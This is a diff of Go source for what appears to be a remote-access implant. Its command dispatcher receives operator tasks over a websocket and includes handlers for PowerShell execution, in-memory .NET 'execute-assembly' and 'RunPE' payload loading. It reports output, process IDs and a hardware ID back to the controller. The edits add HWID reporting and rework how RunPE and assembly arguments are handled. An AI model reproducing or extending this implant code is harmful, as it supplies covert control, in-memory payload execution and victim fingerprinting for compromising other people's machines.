@@ -47,6 +47,7 @@ func SessionLog(log string, Connection *wsc.Wsc, unmsgpack MessagePack.MsgPack) 
 	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
 	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
 	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
+	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
 	SendData(msgpack.Encode2Bytes(), Connection)
 
 }
@@ -78,12 +79,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 				}
 			}
 
-			utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
-			if err != nil {
-				//Log(err.Error(), Connection, *unmsgpack)
-				utf8Stdout = err.Error()
-			}
-			SessionLog(utf8Stdout, Connection, *unmsgpack)
+			SessionLog(result, Connection, *unmsgpack)
 		}()
 	case "OSpowershell":
 		{
@@ -494,8 +490,8 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 	case "execute-assembly":
 		{
 			data := unmsgpack.ForcePathObject("File").GetAsBytes()
-			args := unmsgpack.ForcePathObject("ARGS").GetAsString()
-			fmt.Println(args)
+			args := unmsgpack.ForcePathObject("args").GetAsString()
+			//fmt.Println(args)
 			go func() {
 				if PcInfo.IsDotNetFour {
 					Assembly(data, Connection, args, unmsgpack)
@@ -507,17 +503,10 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 	case "RunPE":
 		{
 			go func() {
-				stdIO := pluginCmd(*unmsgpack)
+				RunPE(*unmsgpack, Connection)
 				//fmt.Println(stdIO)
 
-				result := ""
-				result = string(stdIO)
-				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
-				if err != nil {
-					//Log(err.Error(), Connection, *unmsgpack)
-					utf8Stdout = err.Error()
-				}
-				SessionLog(utf8Stdout, Connection, *unmsgpack)
+				//SessionLog(stdIO, Connection, *unmsgpack)
 			}()
 		}
 
@@ -583,6 +572,5 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 				}
 			}()
 		}
-
 	}
 }
